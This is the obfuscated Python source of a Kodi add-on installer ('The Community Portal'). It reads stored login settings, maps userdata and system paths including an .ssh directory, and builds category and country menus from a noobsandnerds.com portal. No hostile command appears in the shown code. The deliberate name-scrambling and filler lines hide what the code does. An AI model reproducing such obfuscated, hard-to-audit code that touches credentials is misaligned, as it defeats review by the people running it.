import urllib , urllib2 , re , xbmcplugin , xbmcgui , xbmc , xbmcaddon
import os , sys , time , xbmcvfs , glob , shutil , datetime , zipfile , ntpath
import subprocess , threading
import yt , downloader , checkPath
import binascii
import hashlib
import speedtest
if 64 - 64: i11iIiiIii
try :
 from sqlite3 import dbapi2 as database
 if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
except :
 from pysqlite2 import dbapi2 as database
 if 73 - 73: II111iiii
from addon . common . addon import Addon
from addon . common . net import Net
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
######################################################
I1IiI = 'plugin.program.totalinstaller'
o0OOO = 'The Community Portal'
if 13 - 13: ooOo + Oo
o0O = xbmcaddon . Addon ( id = I1IiI )
zip = o0O . getSetting ( 'zip' )
IiiIII111iI = o0O . getSetting ( 'localcopy' )
IiII = o0O . getSetting ( 'private' )
iI1Ii11111iIi = o0O . getSetting ( 'reseller' )
i1i1II = o0O . getSetting ( 'openelec' )
O0oo0OO0 = o0O . getSetting ( 'favourites' )
I1i1iiI1 = o0O . getSetting ( 'sources' )
iiIIIII1i1iI = o0O . getSetting ( 'repositories' )
o0oO0 = o0O . getSetting ( 'mastercopy' )
oo00 = o0O . getSetting ( 'username' ) . replace ( ' ' , '%20' )
o00 = o0O . getSetting ( 'password' )
Oo0oO0ooo = o0O . getSetting ( 'versionoverride' )
o0oOoO00o = o0O . getSetting ( 'login' )
i1 = o0O . getSetting ( 'addonportal' )
oOOoo00O0O = o0O . getSetting ( 'maintenance' )
i1111 = o0O . getSetting ( 'hardwareportal' )
i11 = o0O . getSetting ( 'maintenance' )
I11 = o0O . getSetting ( 'latestnews' )
Oo0o0000o0o0 = o0O . getSetting ( 'tutorialportal' )
oOo0oooo00o = o0O . getSetting ( 'startupvideo' )
oO0o0o0ooO0oO = o0O . getSetting ( 'startupvideopath' )
oo0o0O00 = o0O . getSetting ( 'wizardurl1' )
oO = o0O . getSetting ( 'wizardname1' )
i1iiIIiiI111 = o0O . getSetting ( 'wizardurl2' )
oooOOOOO = o0O . getSetting ( 'wizardname2' )
i1iiIII111ii = o0O . getSetting ( 'wizardurl3' )
i1iIIi1 = o0O . getSetting ( 'wizardname3' )
ii11iIi1I = o0O . getSetting ( 'wizardurl4' )
iI111I11I1I1 = o0O . getSetting ( 'wizardname4' )
OOooO0OOoo = o0O . getSetting ( 'wizardurl5' )
iIii1 = o0O . getSetting ( 'wizardname5' )
oOOoO0 = o0O . getSetting ( 'trcheck' )
O0OoO000O0OO = xbmcgui . Dialog ( )
iiI1IiI = xbmcgui . DialogProgress ( )
II = xbmc . translatePath ( 'special://home/' )
ooOoOoo0O = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
OooO0 = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'addon_data' ) )
II11iiii1Ii = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'Database' ) )
OO0o = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'Thumbnails' ) )
Ooo = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' , '' ) )
O0o0Oo = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'default.py' ) )
Oo00OOOOO = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'fanart.jpg' ) )
O0O = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'resources' , 'addonxml' ) )
O00o0OO = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'guisettings.xml' ) )
I11i1 = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'guifix.xml' ) )
if 25 - 25: iii1I11ii1i1 - OO0oo0oOO + oo0oooooO0
i11Iiii = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'icon_menu.png' ) )
iI = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'favourites.xml' ) )
I1i1I1II = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'sources.xml' ) )
i1IiIiiI = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'advancedsettings.xml' ) )
I1I = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'profiles.xml' ) )
oOO00oOO = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'RssFeeds.xml' ) )
OoOo = xbmc . translatePath ( os . path . join ( ooOoOoo0O , 'keymaps' , 'keyboard.xml' ) )
iIo00O = xbmc . translatePath ( os . path . join ( zip ) )
OOO0OOO00oo = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , '' ) )
Iii111II = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'startup.xml' ) )
iiii11I = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'temp.xml' ) )
Ooo0OO0oOO = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'id.xml' ) )
ii11i1 = xbmc . translatePath ( os . path . join ( Ooo , 'repository.totalinstaller' ) )
IIIii1II1II = xbmc . translatePath ( os . path . join ( Ooo , 'repository.totalrevolution' ) )
i1I1iI = xbmc . translatePath ( os . path . join ( Ooo , 'plugin.program.totalrevolution' ) )
oo0OooOOo0 = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'idtemp.xml' ) )
o0OO00oO = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'temp' ) )
I11i1I1I = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'resources/' ) )
oO0Oo = xbmc . translatePath ( os . path . join ( Ooo , I1IiI , 'default.py' ) )
oOOoo0Oo = xbmc . getSkinDir ( )
o00OO00OoO = xbmc . translatePath ( 'special://logpath/' )
OOOO0OOoO0O0 = '/storage/backup'
O0Oo000ooO00 = '/storage/.restore/'
oO0 = Net ( )
Ii1iIiII1ii1 = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI ) )
ooOooo000oOO = xbmc . translatePath ( os . path . join ( Ii1iIiII1ii1 , 'guinew.xml' ) )
Oo0oOOo = xbmc . translatePath ( os . path . join ( Ii1iIiII1ii1 , 'guitemp' , '' ) )
Oo0OoO00oOO0o = xbmc . translatePath ( os . path . join ( iIo00O , 'Database' ) )
OOO00O = os . path . join ( Ooo , 'packages' )
OOoOO0oo0ooO = os . path . join ( ooOoOoo0O , 'addontemp' )
O0o0O00Oo0o0 = xbmc . translatePath ( os . path . join ( ooOoOoo0O , '.cbcfg' ) )
O00O0oOO00O00 = 'http://urlshortbot.com/noobs'
i1Oo00 = [ 'firstrun' , 'plugin.program.tbs' , 'plugin.program.totalinstaller' , 'script.module.addon.common' , 'addons' , 'addon_data' , 'userdata' , 'sources.xml' , 'favourites.xml' ]
i1i = 0.0
iiI111I1iIiI = 0.0
IIIi1I1IIii1II = '0'
O0ii1ii1ii = [ '/storage/.kodi' , '/storage/.cache' , '/storage/.config' , '/storage/.ssh' ]
oooooOoo0ooo = '1889903'
if 6 - 6: oOoO0o00OO0 - iI1iiIiiII . OOo00O0 / i1IIi % OoOoOO00
if 23 - 23: OoO0O00 + OoO0O00 . Oo
if 38 - 38: iI1iiIiiII
class Ii1 ( xbmcgui . WindowXMLDialog ) :
 if 82 - 82: I1ii11iIi11i - iIii1I11I1II1 / Oo + OO0oo0oOO
 def __init__ ( self , * args , ** kwargs ) :
  self . shut = kwargs [ 'close_time' ]
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  xbmc . executebuiltin ( "Skin.SetBool(AnimeWindowXMLDialogClose)" )
  if 87 - 87: ooOo * I1ii11iIi11i + Oo / iIii1I11I1II1 / oo0oooooO0
 def onFocus ( self , controlID ) :
  pass
  if 37 - 37: oo0oooooO0 - OOo00O0 * ooOo % i11iIiiIii - iI1iiIiiII
 def onClick ( self , controlID ) :
  if controlID == 12 :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 83 - 83: iii1I11ii1i1 / I1IiiI
 def onAction ( self , action ) :
  if action in [ 5 , 6 , 7 , 9 , 10 , 92 , 117 ] or action . getButtonCode ( ) in [ 275 , 257 , 261 ] :
   xbmc . Player ( ) . stop ( )
   self . _close_dialog ( )
   if 34 - 34: oOoO0o00OO0
 def _close_dialog ( self ) :
  xbmc . executebuiltin ( "Skin.Reset(AnimeWindowXMLDialogClose)" )
  time . sleep ( .4 )
  self . close ( )
  if 57 - 57: ooOo . iii1I11ii1i1 . i1IIi
  if 42 - 42: iii1I11ii1i1 + I1ii11iIi11i % O0
def i1iIIIi1i ( name , url , mode , iconimage , fanart , video , description , skins , guisettingslink , artpack ) :
 iI1iIIiiii = sys . argv [ 0 ]
 iI1iIIiiii += "?url=" + urllib . quote_plus ( url )
 iI1iIIiiii += "&mode=" + str ( mode )
 iI1iIIiiii += "&name=" + urllib . quote_plus ( name )
 iI1iIIiiii += "&iconimage=" + urllib . quote_plus ( iconimage )
 iI1iIIiiii += "&fanart=" + urllib . quote_plus ( fanart )
 iI1iIIiiii += "&video=" + urllib . quote_plus ( video )
 iI1iIIiiii += "&description=" + urllib . quote_plus ( description )
 iI1iIIiiii += "&skins=" + urllib . quote_plus ( skins )
 iI1iIIiiii += "&guisettingslink=" + urllib . quote_plus ( guisettingslink )
 iI1iIIiiii += "&artpack=" + urllib . quote_plus ( artpack )
 if 26 - 26: iii1I11ii1i1 . OoooooooOO
 I11i1ii1 = True
 O0Oooo0O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 84 - 84: oo0oooooO0 . I1ii11iIi11i / Oo0Ooo - I1IiiI / OoooooooOO / o0oOOo0O0Ooo
 O0Oooo0O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0Oooo0O . setProperty ( "Fanart_Image" , fanart )
 O0Oooo0O . setProperty ( "Build.Video" , video )
 if 12 - 12: I1IiiI * oo0oooooO0 % i1IIi % iIii1I11I1II1
 if ( mode == None ) or ( mode == 'restore_option' ) or ( mode == 'backup_option' ) or ( mode == 'cb_root_menu' ) or ( mode == 'genres' ) or ( mode == 'grab_builds' ) or ( mode == 'community_menu' ) or ( mode == 'instructions' ) or ( mode == 'countries' ) or ( mode == 'update_build' ) or ( url == None ) or ( len ( url ) < 1 ) :
  if 20 - 20: Oo % OO0oo0oOO / OO0oo0oOO + OO0oo0oOO
  I11i1ii1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = True )
  if 45 - 45: ooOo - oOoO0o00OO0 - OoooooooOO - OoO0O00 . II111iiii / O0
 else :
  I11i1ii1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = False )
  if 51 - 51: O0 + oo0oooooO0
 return I11i1ii1
 if 8 - 8: ooOo * OoOoOO00 - OO0oo0oOO - OoO0O00 * Oo % I1IiiI
 if 48 - 48: O0
def I1IiiIIIi ( handle , url , listitem , isFolder ) :
 xbmcplugin . addDirectoryItem ( handle , url , listitem , isFolder )
 if 41 - 41: OO0oo0oOO - O0 - O0
 if 68 - 68: Oo % iI1iiIiiII
def ooO00OO0 ( name , url , mode , iconimage , fanart , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 if 31 - 31: oo0oooooO0 % oo0oooooO0 % iii1I11ii1i1
 iconimage = i11Iiii
 if 69 - 69: OoO0O00 - Oo0Ooo + i1IIi / iI1iiIiiII
 iI1iIIiiii = sys . argv [ 0 ]
 iI1iIIiiii += "?url=" + urllib . quote_plus ( url )
 iI1iIIiiii += "&mode=" + str ( mode )
 iI1iIIiiii += "&name=" + urllib . quote_plus ( name )
 iI1iIIiiii += "&iconimage=" + urllib . quote_plus ( iconimage )
 iI1iIIiiii += "&fanart=" + urllib . quote_plus ( fanart )
 iI1iIIiiii += "&author=" + urllib . quote_plus ( author )
 iI1iIIiiii += "&description=" + urllib . quote_plus ( description )
 iI1iIIiiii += "&version=" + urllib . quote_plus ( version )
 iI1iIIiiii += "&buildname=" + urllib . quote_plus ( buildname )
 iI1iIIiiii += "&updated=" + urllib . quote_plus ( updated )
 iI1iIIiiii += "&skins=" + urllib . quote_plus ( skins )
 iI1iIIiiii += "&videoaddons=" + urllib . quote_plus ( videoaddons )
 iI1iIIiiii += "&audioaddons=" + urllib . quote_plus ( audioaddons )
 iI1iIIiiii += "&buildname=" + urllib . quote_plus ( buildname )
 iI1iIIiiii += "&programaddons=" + urllib . quote_plus ( programaddons )
 iI1iIIiiii += "&pictureaddons=" + urllib . quote_plus ( pictureaddons )
 iI1iIIiiii += "&sources=" + urllib . quote_plus ( sources )
 iI1iIIiiii += "&adult=" + urllib . quote_plus ( adult )
 if 49 - 49: O0 . oo0oooooO0
 I11i1ii1 = True
 O0Oooo0O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 11 - 11: oOoO0o00OO0 * I1IiiI . iIii1I11I1II1 % OoooooooOO + oo0oooooO0
 O0Oooo0O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0Oooo0O . setProperty ( "Fanart_Image" , fanart )
 O0Oooo0O . setProperty ( "Build.Video" , OOO )
 if 68 - 68: II111iiii + iii1I11ii1i1
 I11i1ii1 = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = False )
 if 45 - 45: oo0oooooO0 / oo0oooooO0 + iI1iiIiiII + OOo00O0
 return I11i1ii1
 if 47 - 47: o0oOOo0O0Ooo + OOo00O0
def OoO ( title , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' , zip_link = '' , repo_link = '' , repo_id = '' , addon_id = '' , provider_name = '' , forum = '' , data_path = '' ) :
 if len ( iconimage ) > 0 :
  if 88 - 88: oo0oooooO0 . II111iiii * II111iiii % iI1iiIiiII
  iconimage = i11Iiii
 else :
  iconimage = 'DefaultFolder.png'
  if 15 - 15: i1IIi * I1IiiI + i11iIiiIii
 if fanart == '' :
  fanart = Oo00OOOOO
  if 6 - 6: OOo00O0 / i11iIiiIii + oo0oooooO0 * ooOo
 iI1iIIiiii = sys . argv [ 0 ]
 iI1iIIiiii += "?url=" + urllib . quote_plus ( url )
 iI1iIIiiii += "&zip_link=" + urllib . quote_plus ( zip_link )
 iI1iIIiiii += "&repo_link=" + urllib . quote_plus ( repo_link )
 iI1iIIiiii += "&data_path=" + urllib . quote_plus ( data_path )
 iI1iIIiiii += "&provider_name=" + str ( provider_name )
 iI1iIIiiii += "&forum=" + str ( forum )
 iI1iIIiiii += "&repo_id=" + str ( repo_id )
 iI1iIIiiii += "&addon_id=" + str ( addon_id )
 iI1iIIiiii += "&mode=" + str ( mode )
 iI1iIIiiii += "&name=" + urllib . quote_plus ( name )
 iI1iIIiiii += "&fanart=" + urllib . quote_plus ( fanart )
 iI1iIIiiii += "&video=" + urllib . quote_plus ( video )
 iI1iIIiiii += "&description=" + urllib . quote_plus ( description )
 if 80 - 80: II111iiii
 I11i1ii1 = True
 O0Oooo0O = xbmcgui . ListItem ( title , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 83 - 83: iii1I11ii1i1 . i11iIiiIii + II111iiii . o0oOOo0O0Ooo * iii1I11ii1i1
 O0Oooo0O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0Oooo0O . setProperty ( "Fanart_Image" , fanart )
 O0Oooo0O . setProperty ( "Build.Video" , video )
 if 53 - 53: II111iiii
 I1IiiIIIi ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = False )
 if 31 - 31: OoO0O00
 if 80 - 80: iI1iiIiiII . i11iIiiIii - o0oOOo0O0Ooo
def iIiIIi1 ( type , name , url , mode , iconimage = '' , fanart = '' , video = '' , description = '' ) :
 if type != 'folder2' and type != 'addon' :
  if 7 - 7: OOo00O0 - Oo0Ooo - ooOo + OOo00O0
  if 26 - 26: OO0oo0oOO
  if 35 - 35: OO0oo0oOO - I1IiiI % o0oOOo0O0Ooo . OoooooooOO % OO0oo0oOO
  if 47 - 47: oo0oooooO0 - OO0oo0oOO . II111iiii + OoooooooOO . i11iIiiIii
  if 94 - 94: o0oOOo0O0Ooo * OO0oo0oOO / Oo0Ooo / OO0oo0oOO
  if 87 - 87: Oo0Ooo . oOoO0o00OO0
  iconimage = i11Iiii
 if type == 'addon' :
  if 75 - 75: OOo00O0 + OoOoOO00 + o0oOOo0O0Ooo * iii1I11ii1i1 % ooOo . oo0oooooO0
  if len ( iconimage ) > 0 :
   iconimage = iconimage
  else :
   iconimage = 'DefaultFolder.png'
   if 55 - 55: Oo . I1IiiI
   if 61 - 61: Oo0Ooo % oOoO0o00OO0 . Oo0Ooo
   if 100 - 100: iI1iiIiiII * O0
 if fanart == '' :
  fanart = Oo00OOOOO
  if 64 - 64: Oo % iIii1I11I1II1 * ooOo
 iI1iIIiiii = sys . argv [ 0 ]
 iI1iIIiiii += "?url=" + urllib . quote_plus ( url )
 iI1iIIiiii += "&mode=" + str ( mode )
 iI1iIIiiii += "&name=" + urllib . quote_plus ( name )
 iI1iIIiiii += "&fanart=" + urllib . quote_plus ( fanart )
 iI1iIIiiii += "&video=" + urllib . quote_plus ( video )
 iI1iIIiiii += "&description=" + urllib . quote_plus ( description )
 if 79 - 79: O0
 I11i1ii1 = True
 O0Oooo0O = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 if 78 - 78: I1ii11iIi11i + Oo - iI1iiIiiII
 O0Oooo0O . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 O0Oooo0O . setProperty ( "Fanart_Image" , fanart )
 O0Oooo0O . setProperty ( "Build.Video" , video )
 if 38 - 38: o0oOOo0O0Ooo - ooOo + iIii1I11I1II1 / OoOoOO00 % Oo0Ooo
 if ( type == 'folder' ) or ( type == 'folder2' ) or ( type == 'tutorial_folder' ) or ( type == 'news_folder' ) :
  I11i1ii1 = I1IiiIIIi ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = True )
  if 57 - 57: OoO0O00 / OOo00O0
 else :
  I11i1ii1 = I1IiiIIIi ( handle = int ( sys . argv [ 1 ] ) , url = iI1iIIiiii , listitem = O0Oooo0O , isFolder = False )
  if 29 - 29: iIii1I11I1II1 + OoOoOO00 * OoO0O00 * Oo . I1IiiI * I1IiiI
 return I11i1ii1
 if 7 - 7: oOoO0o00OO0 * iI1iiIiiII % OO0oo0oOO - o0oOOo0O0Ooo
 if 13 - 13: OO0oo0oOO . i11iIiiIii
def oOOoo00O00o ( url ) :
 iIiIIi1 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Audio' , url + '&typex=audio' , 'grab_addons' , 'audio.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Image (Picture)' , url + '&typex=image' , 'grab_addons' , 'pictures.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Program' , url + '&typex=program' , 'grab_addons' , 'programs.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow][PLUGIN][/COLOR] Video' , url + '&typex=video' , 'grab_addons' , 'video.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Movies (Used for library scanning)' , url + '&typex=movie%20scraper' , 'grab_addons' , 'movies.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] TV Shows (Used for library scanning)' , url + '&typex=tv%20show%20scraper' , 'grab_addons' , 'tvshows.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Artists (Used for library scanning)' , url + '&typex=artist%20scraper' , 'grab_addons' , 'artists.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][SCRAPER][/COLOR] Music Videos (Used for library scanning)' , url + '&typex=music%20video%20scraper' , 'grab_addons' , 'musicvideos.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] All Services' , url + '&typex=service' , 'grab_addons' , 'services.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange][SERVICE][/COLOR] Weather Service' , url + '&typex=weather' , 'grab_addons' , 'weather.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Repositories' , url + '&typex=repository' , 'grab_addons' , 'repositories.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Scripts (Program Add-ons)' , url + '&typex=executable' , 'grab_addons' , 'scripts.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Screensavers' , url + '&typex=screensaver' , 'grab_addons' , 'screensaver.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Script Modules' , url + '&typex=script%20module' , 'grab_addons' , 'scriptmodules.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Skins' , url + '&typex=skin' , 'grab_addons' , 'skins.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Subtitles' , url + '&typex=subtitles' , 'grab_addons' , 'subtitles.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][OTHER][/COLOR] Web Interface' , url + '&typex=web%20interface' , 'grab_addons' , 'webinterface.png' , '' , '' , '' )
 if 98 - 98: Oo + oOoO0o00OO0 + ooOo % OoooooooOO
 if 97 - 97: O0 * OoooooooOO . OoooooooOO
def I111iI ( ) :
 oOOo0 ( )
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://outdated/",return)' )
 if 16 - 16: ooOo % I1ii11iIi11i * i11iIiiIii % i11iIiiIii
 if 65 - 65: OO0oo0oOO - ooOo + ooOo + II111iiii
def o0oooOOoOo0 ( url ) :
 iIiIIi1 ( 'folder' , 'African' , url + '&genre=african' , 'grab_addons' , 'african.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Arabic' , url + '&genre=arabic' , 'grab_addons' , 'arabic.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Asian' , url + '&genre=asian' , 'grab_addons' , 'asian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Australian' , url + '&genre=australian' , 'grab_addons' , 'australian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Austrian' , url + '&genre=austrian' , 'grab_addons' , 'austrian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Belgian' , url + '&genre=belgian' , 'grab_addons' , 'belgian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Brazilian' , url + '&genre=brazilian' , 'grab_addons' , 'brazilian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Canadian' , url + '&genre=canadian' , 'grab_addons' , 'canadian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Chinese' , url + '&genre=chinese' , 'grab_addons' , 'chinese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Colombian' , url + '&genre=columbian' , 'grab_addons' , 'columbian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Croatian' , url + '&genre=croatian' , 'grab_addons' , 'croatian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Czech' , url + '&genre=czech' , 'grab_addons' , 'czech.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Danish' , url + '&genre=danish' , 'grab_addons' , 'danish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Dominican' , url + '&genre=dominican' , 'grab_addons' , 'dominican.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Dutch' , url + '&genre=dutch' , 'grab_addons' , 'dutch.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Egyptian' , url + '&genre=egyptian' , 'grab_addons' , 'egyptian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Filipino' , url + '&genre=filipino' , 'grab_addons' , 'filipino.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Finnish' , url + '&genre=finnish' , 'grab_addons' , 'finnish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'French' , url + '&genre=french' , 'grab_addons' , 'french.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'German' , url + '&genre=german' , 'grab_addons' , 'german.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Greek' , url + '&genre=greek' , 'grab_addons' , 'greek.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Hebrew' , url + '&genre=hebrew' , 'grab_addons' , 'hebrew.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Hungarian' , url + '&genre=hungarian' , 'grab_addons' , 'hungarian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Icelandic' , url + '&genre=icelandic' , 'grab_addons' , 'icelandic.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Indian' , url + '&genre=indian' , 'grab_addons' , 'indian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Irish' , url + '&genre=irish' , 'grab_addons' , 'irish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Italian' , url + '&genre=italian' , 'grab_addons' , 'italian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Japanese' , url + '&genre=japanese' , 'grab_addons' , 'japanese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Korean' , url + '&genre=korean' , 'grab_addons' , 'korean.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Lebanese' , url + '&genre=lebanese' , 'grab_addons' , 'lebanese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Mongolian' , url + '&genre=mongolian' , 'grab_addons' , 'mongolian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Moroccan' , url + '&genre=moroccan' , 'grab_addons' , 'moroccan.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Nepali' , url + '&genre=nepali' , 'grab_addons' , 'nepali.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'New Zealand' , url + '&genre=newzealand' , 'grab_addons' , 'newzealand.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Norwegian' , url + '&genre=norwegian' , 'grab_addons' , 'norwegian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Pakistani' , url + '&genre=pakistani' , 'grab_addons' , 'pakistani.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Polish' , url + '&genre=polish' , 'grab_addons' , 'polish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Portuguese' , url + '&genre=portuguese' , 'grab_addons' , 'portuguese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Romanian' , url + '&genre=romanian' , 'grab_addons' , 'romanian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Russian' , url + '&genre=russian' , 'grab_addons' , 'russian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Singapore' , url + '&genre=singapore' , 'grab_addons' , 'singapore.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Spanish' , url + '&genre=spanish' , 'grab_addons' , 'spanish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Swedish' , url + '&genre=swedish' , 'grab_addons' , 'swedish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Swiss' , url + '&genre=swiss' , 'grab_addons' , 'swiss.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Syrian' , url + '&genre=syrian' , 'grab_addons' , 'syrian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Tamil' , url + '&genre=tamil' , 'grab_addons' , 'tamil.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Thai' , url + '&genre=thai' , 'grab_addons' , 'thai.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Turkish' , url + '&genre=turkish' , 'grab_addons' , 'turkish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'UK' , url + '&genre=uk' , 'grab_addons' , 'uk.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'USA' , url + '&genre=usa' , 'grab_addons' , 'usa.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Vietnamese' , url + '&genre=vietnamese' , 'grab_addons' , 'vietnamese.png' , '' , '' , '' )
 if 74 - 74: iIii1I11I1II1 * I1ii11iIi11i + OoOoOO00 / i1IIi / II111iiii . Oo0Ooo
 if 62 - 62: OoooooooOO * I1IiiI
def oOOOoo0O0oO ( url ) :
 iIII1I111III = 'http://noobsandnerds.com/TI/AddonPortal/addondetails.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 100 - 100: I1IiiI / o0oOOo0O0Ooo % II111iiii % Oo0Ooo % Oo
 O00oO000O0O = re . compile ( 'addon_types="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 I1111i = re . compile ( 'UID="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIii = re . compile ( 'id="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
